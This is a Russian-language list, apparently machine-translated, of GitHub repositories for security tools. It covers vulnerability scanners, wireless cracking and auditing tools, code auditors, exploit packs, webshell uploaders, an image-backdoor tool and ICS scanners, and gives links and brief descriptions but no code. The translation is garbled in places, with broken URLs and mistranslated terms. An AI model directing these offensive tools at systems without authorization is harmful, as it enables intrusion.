- https://github.com/kotobukki/BDA (инструмент обнаружения уязвимостей для платформ больших данных, таких как hadoop / spark)
- https://github.com/jagracey/Regex -DoS ( RegEx сканер отказа в обслуживании)
- https://github.com/milesrichardson/docker-onion-nmap(Используйте nmap для сканирования скрытого «лукового» сервиса в сети Tor)
- https://github.com/Moham3dRiahi/XAttacker (инструмент для эксплойтов Web CMS, включая 66 различных эксплойтов для основной CMS)
- https://github.com/ lijiejie / BBScan (мини-скрипт пакетного сканирования с утечкой информации
) сканер беспроводной сети (аудит)
- https://github.com/savio-code/fern-wifi-cracker/ (инструмент аудита безопасности беспроводной сети )
- https://github. com / m4n3dw0lf / PytheM (инструмент тестирования сетей / проникновения Python)
- https://github.com/P0cL4bs/WiFi-Pumpkin (набор тестов на проникновение беспроводной безопасности)
- https://github.com/MisterBianco/BoopSuite (инструмент аудита беспроводной сети, Поддержка диапазона частот 2-5 ГГц)
- https://github.com/DanMcInerney/LANs.py (спуфинг ARP, угон беспроводной сети)
- https://github.com/besimaltnok/PiFinger (проверьте, открыт ли Wi-Fi «Большим ананасом» Горячая точка, и дайте оценку сети)
- https://github.com/derv82/wifite2(Восстановленная версия автоматизированного инструмента для атаки на беспроводную сеть wifite)
Сканер локальной сети (
- https://github.com/sowish/LNScan) (сканирование локальной сети на основе BBScan via.lijiejie)
- https://github.com/ niloofarkheirkhah / Нили (сканирование по сети, средние атаки, обнаружение протокола и обратный)
- https://github.com/SkyLined/LocalNetworkScanner (JavaScript на основе локальной сети сканирования)
код инструмент аудита или сканер
- https://github.com/wufeifei/ cobra (система аудита безопасности кода белого ящика)
- https://github.com/OneSourceCat/phpvulhunter (аудит статического php-кода)
- https://github.com/Qihoo360/phptrace (инструмент для отслеживания и анализа работы PHP)
- https://github.com/ajinabraham/NodeJsScan (аудит кода приложения NodeJS)
- https://github.com/shengqi158/pyvulhunter (аудит приложения Python)
- https://github.com/presidentbeef/brakeman(Статический анализ кода приложения Ruby on Rails)
- https://github.com/python-security/pyt ( модульный дизайн статического аудита приложения Python)
- https://github.com/m4ll0k/WPSploit (аудит безопасности кода плагина WordPress)
Инфраструктура сканера или обнаружения уязвимостей
- https://github.com/az0ne/AZScanner (автоматический сканер уязвимостей, уничтожение поддоменов, сканирование портов, очистка каталогов, обнаружение уязвимостей общей инфраструктуры)
- https://github.com/blackye/lalascan ( Распределенная среда сканирования веб-уязвимостей, которая объединяет возможности сканирования уязвимостей owasp top10 и возможности обнаружения пограничных активов)
- https://github.com/blackye/BkScanner (BkScanner, подключаемый модуль, сканер веб-уязвимостей)
- https://github.com/ysrc / GourdScanV2 (средство сканирования пассивных уязвимостей, разработанное ysrc)
- https://github.com/netxfly/passive_scan (сканер веб-уязвимостей на основе прокси-http)
- https://github.com/1N3/Sn1per (автоматический сканер, включая (Сканирование промежуточного программного обеспечения и распознавание отпечатков пальцев устройства)
- https://github.com/RASSec/pentestEr_Fully-automatic-scanner(Направленный полностью автоматизированный инструмент тестирования на проникновение)
- https://github.com/3xp10it/3xp10it (среда автоматического тестирования на проникновение, поддержка cdn real ip search, распознавание отпечатков пальцев и т. Д.)
Https://github.com/Lcys/lcyscan (плагин python) Сканер уязвимостей, поддержка создания отчетов о сканировании)
- https://github.com/Xyntax/POC-T (среда параллелизма плагина для тестирования на проникновение)
- https://github.com/v3n0m-Scanner/V3n0M-Scanner (поддержка обнаружения SQLi / XSS / LFI / RFI и другие сканеры уязвимостей)
- https://github.com/Skycrab/leakScan (веб-среда для сканирования уязвимостей в графической среде )
- https://github.com/zhangzhenfeng/AnyScan (автоматизация на основе Интернета) Инфраструктура тестирования на проникновение)
- https://github.com/Tuhinshubhra/RED_HAWK (универсальное средство сканирования, которое объединяет сбор информации, сканирование уязвимостей, распознавание отпечатков пальцев и т. Д.)
Https://github.com/Arachni/arachni (высокоинтегрированный Инфраструктура сканирования уязвимостей веб-приложений, поддерживающая вызовы REST, RPC и другие API)
- https://github.com/infobyte/faraday (интегрированная вспомогательная платформа для тестирования на проникновение и платформа для управления уязвимостями)
- https://github.com/boy-hack/w8scan (сканер, основанный на сканировании bugscan и архитектурных идеях)
- https://github.com/juansacco/exploitpack (интегрированная среда тестирования на проникновение, включающая более 38 000+ эксплойтов)
- https://github.com/swisskyrepo/DamnWebScanner (пассивное сканирование уязвимостей на основе плагина chrome / opera)
- https://github.com/anilbaranyelken/tulpar (поддерживает множественное сканирование веб-уязвимостей, используемое в среде командной строки)
- https://github.com / m4ll0k / Spaghetti (сканер веб-приложений, поддерживает распознавание отпечатков пальцев, удаление папок с файлами, сканирование SQL / XSS / RFI и другие уязвимости, а также может использоваться непосредственно для Struts, ShellShock и другого сканирования)
- https://github.com/Yukinoshita47/ Yuki-Chan-The-Auto-Pentest (сканер веб-приложений со встроенным перечислением поддоменов, nmap, распознаванием отпечатков пальцев и другими модулями)
- https://github.com/0xsauby/yasuo (в сети сканирования, разработанной ruby, существуют хосты) Уязвимость в сторонней службе веб-приложений)
- https://github.com/hatRiot/clusterd (среда сканирования веб-приложений, поддерживает автоматическую загрузку веб-оболочки)
- https://github.com/erevus-cn/pocscan (платформа вызова Poc с открытым исходным кодом, которая может легко вызывать Pocsuite, Tangscan, Beebeeto, старые версии POC Knowsec, может быть развернута с помощью докера)
- https://github.com/TophantTechnology/ osprey (среда обнаружения уязвимостей с открытым исходным кодом, разработанная Центром компетенций Douxiang и поддерживаемая в течение длительного времени)
- https://github.com/yangbh/Hammer (среда сканирования уязвимостей веб-приложений)
- https://github.com/Lucifer1993/AngelSword (сканирование уязвимостей веб-приложений Framework, основанный на python3)
- https://github.com/secrary/EllaScanner (пассивное сканирование уязвимостей, поддержка выявления уязвимостей по историческому номеру Cve)
- https://github.com/zaproxy/zaproxy (всеобъемлющее проникновение в основной проект OWASP ZAP Инструмент тестирования)
- https://github.com/sullo/nikto (встроенный сканер веб-служб, используемый для сбора активов, дефектов конфигурации безопасности или сканирования уязвимостей указанной цели)
- https://github.com/UltimateHackers/Striker ( Многофункциональный инструмент сбора информации, идентификации отпечатков пальцев и поиска уязвимостей)
- https://github.com/dermotblair/webvulscan(Сканер уязвимостей веб-приложений, который поддерживает сканирование рефлексивных и хранилищ xss, sql-инъекций и других уязвимостей и поддерживает вывод отчетов в формате pdf)
- https://github.com/alienwithin/OWASP-mth3l3m3nt-framework (вспомогательный инструмент для тестирования на проникновение, комплексный с использованием рамок)
выдвинутой постоянная угроза (APT) инструменты
- https://github.com/Neo23x0/Loki (APT нашествие метка сканера)
- https://github.com/r00t-3xp10it/FakeImageExploiter ( с помощью прилагаемого изображения бэкдора Инструменты - FakeImageExploiter)
инструменты, связанные с безопасностью промышленного контроля
- https://github.com/w3h/icsmaster/tree/master/nse (скрипт сканирования nmap устройства ICS)
